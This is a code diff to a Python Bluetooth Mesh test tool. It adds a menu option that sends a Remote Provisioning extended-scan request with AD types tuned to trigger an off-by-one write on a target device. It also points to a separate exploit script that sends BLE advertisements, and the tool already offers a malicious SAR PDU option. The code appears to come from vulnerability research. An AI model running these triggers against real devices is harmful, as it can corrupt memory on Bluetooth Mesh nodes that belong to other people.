@@ -63,12 +63,13 @@ class MeshManager:
             print("  11. 手动触发配置 (Manual Re-Config Target)")
             print("  12. 发送自定义 SAR PDU (Custom SAR PDU)")
             print("  13. 发送错误自定义 SAR PDU (Malicious SAR PDU)")
-            
+            print("  14. 触发 Off-by-one 溢出 (Finding #2)")
+
             print("\n --- 其他 ---")
-            print("  14. 退出 (Quit)")
+            print("  15. 退出 (Quit)")
             print("-" * 45)
             
-            choice = await asyncio.to_thread(input, "请选择操作 [1-14]: ")
+            choice = await asyncio.to_thread(input, "请选择操作 [1-15]: ")
             
             if choice == '1':
                 await self.scan_flow()
@@ -97,6 +98,8 @@ class MeshManager:
             elif choice == '13':
                 await self.send_custom_sar_pdu(seg_n=1, seg_o=31, is_malicious=True)
             elif choice == '14':
+                await self.off_by_one_flow()
+            elif choice == '15':
                 break
             else:
                 print("无效选择")
@@ -293,8 +296,25 @@ class MeshManager:
         await self.stack.send_model_message(self.target_addr, self.stack.onoff_client, opcode, payload, app_key=self.app_key)
         print("状态查询已发送，等待回复...")
 
+    async def off_by_one_flow(self):
+        """触发 Finding #2: EXT_SCAN_START → 对方注册 AD 过滤器 → 再发 BLE 广播填充 list"""
+        if not self.target_addr:
+            print("[-] 错误: 请先设置目标地址")
+            return
+
+        # 7 个 AD type: sum(len)+7=60 → 精确触发 list[60] 越界
+        ad_types = [10, 9, 8, 7, 6, 4, 2]
+
+        opcode, payload = self.stack.rp_client.ext_scan_start(ad_types, timeout=20)
+        await self.stack.send_model_message(self.target_addr, self.stack.rp_client, opcode, payload)
+        print(f"[+] EXT_SCAN_START 已发送 (AD types: {ad_types})")
+        print("[!] 现在在另一个终端运行:")
+        print("[!]   sudo .venv/bin/python -m examples.exploit_off_by_one hci-socket:3")
+        print("[!] 脚本会提示按 Enter 后发送 7 个 BLE 广播包")
+        print("[!] 第 7 个包触发 off-by-one → scan->list[60]=0")
+
+
 async def main():
-    # 自动识别 HCI 端口
     transport_path = sys.argv[1] if len(sys.argv) > 1 else 'hci-socket:1'
     
     async with await open_transport(transport_path) as (hci_source, hci_sink):
